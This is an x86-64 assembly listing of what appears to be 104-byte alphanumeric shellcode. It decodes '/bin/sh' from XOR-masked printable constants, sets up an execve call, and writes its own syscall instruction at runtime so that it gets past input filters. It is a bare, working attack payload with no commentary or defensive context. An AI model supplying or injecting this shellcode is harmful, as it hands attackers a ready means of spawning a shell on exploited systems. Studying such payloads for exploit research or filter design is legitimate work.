# 104 bytes
.text
.global _start
_start:
  pop %rax
  push %rsp
  pop %rax
  xor $0x65,%al
  xor $0x75,%al
  xor %rsi, (%rax)   # mov emulated into rsi
  xor (%rax), %rsi
  push %rsi
  pop %rcx
  pushq $0x3030474a
  pop %rax
  xor %eax,0x64(%rcx)
  push %rsp
  pop %rcx
  pop %rax
  movslq 0x30(%rcx),%rsi
  xor %esi,0x30(%rcx)
  movslq 0x34(%rcx),%rsi
  xor %esi,0x34(%rcx)
  movslq 0x30(%rcx),%rdi
  movslq 0x30(%rcx),%rsi
  push %rdi
  pop %rdx
  pushq $0x5a58555a
  pop %rax
  xor $0x34313775,%eax
  xor %eax,0x30(%rcx)
  pushq $0x6a51475a
  pop %rax
  xor $0x6a393475,%eax
  xor %eax,0x34(%rcx)
  xor 0x30(%rcx),%rdi
  pop %rax
  push %rdi
  pushq $0x58
  movslq (%rcx),%rdi
  xor (%rcx),%rdi
  pop %rax
  push %rsp
  xor (%rcx),%rdi
  xor $0x63,%al
  rex.RB
  rex.X xor %sil,(%rax)
